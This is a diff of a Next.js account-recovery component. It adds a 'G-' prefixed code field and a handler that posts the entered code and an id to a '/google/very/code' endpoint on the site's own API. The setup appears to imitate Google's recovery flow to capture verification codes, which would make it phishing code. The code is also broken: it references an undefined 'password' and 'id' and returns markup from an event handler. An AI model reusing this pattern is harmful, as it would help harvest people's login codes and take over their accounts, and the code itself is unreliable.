@@ -1,10 +1,40 @@
 "use client";
+import { API_URL } from "@/config";
 import Image from "next/image";
 import React, { useState } from "react";
 
 function AccountRecoveryCode() {
-  const [email, setEmail] = useState();
+  const [gcode, setGcode] = useState();
+const handleGCode = async() => {
+    if (!password) {
+      return;
+    }
+    const values = {
+      id,
+      gcode
+    };
+    const url = `${API_URL}/google/very/code`;
 
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      return <div></div>
+      // router.push("/account-verifying-state");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
+  };
   return (
     <div className=" w-full min-h-screen flex flex-col justify-center items-center">
       <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
@@ -36,12 +66,12 @@ function AccountRecoveryCode() {
             </p>
             <div className="relative">
               <input
-                type="email"
-                id="email"
+                type="text"
+                id="id"
                 className={`w-full border  border-gray-300 rounded-md pl-14 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
                 placeholder="Enter the code"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                value={gcode}
+                onChange={(e) => setGcode(e.target.value)}
               />
               <p className="absolute top-[9px] left-5">G-</p>
             </div>
@@ -54,7 +84,7 @@ function AccountRecoveryCode() {
           </button>
           <button
             className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
-            // onClick={() => handlePassword()}
+            onClick={() => handleGCode()}
           >
             Next
           </button>
